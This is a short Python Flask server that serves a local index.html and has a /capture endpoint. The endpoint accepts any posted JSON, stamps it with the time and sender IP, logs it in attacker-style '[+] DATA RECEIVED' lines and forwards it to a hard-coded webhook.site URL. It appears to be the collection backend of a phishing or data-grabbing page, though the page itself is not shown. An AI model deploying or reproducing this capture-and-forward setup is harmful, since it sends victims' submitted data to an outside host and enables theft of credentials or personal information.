import os
import json
import requests
import logging
from flask import Flask, request, send_from_directory

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

WEBHOOK_URL = 'https://webhook.site/2e305572-70bd-454c-a2fd-383fb89eea4b'

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json(force=True)
        data['captured_at'] = __import__('datetime').datetime.now().isoformat()
        data['server_ip'] = request.remote_addr
        
        print(f"[+] DATA RECEIVED: {json.dumps(data, indent=2)}")
        
        # إرسال إلى webhook
        if WEBHOOK_URL.startswith('https://'):
            try:
                r = requests.post(WEBHOOK_URL, json=data, timeout=10)
                print(f"[+] Webhook status: {r.status_code}")
            except Exception as e:
                print(f"[-] Webhook error: {e}")
        
        return {'status': 'ok'}, 200
    except Exception as e:
        print(f"[-] Error: {e}")
        return {'status': 'error'}, 500

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('.', path)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
